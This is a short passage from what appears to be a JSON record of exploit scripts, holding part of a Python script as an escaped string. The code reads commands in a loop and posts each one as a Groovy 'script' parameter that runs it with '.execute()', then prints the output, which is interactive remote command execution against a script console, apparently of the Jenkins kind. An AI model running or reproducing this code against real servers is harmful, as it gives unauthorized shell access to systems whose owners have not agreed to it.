execute (or type 'exit' to exit): \")\r\n    if CMD == 'exit':\r\n        print(\"exiting...\\n\")\r\n        exit(0)\r\n\r\n    DATA = {\r\n        'script': 'println \"{}\".execute().text'.format(CMD)\r\n    }\r\n    result = requests.post(URL, headers=HEADERS, data=DATA)\r\n    print(result.text)"
  },
  "requirements": null
}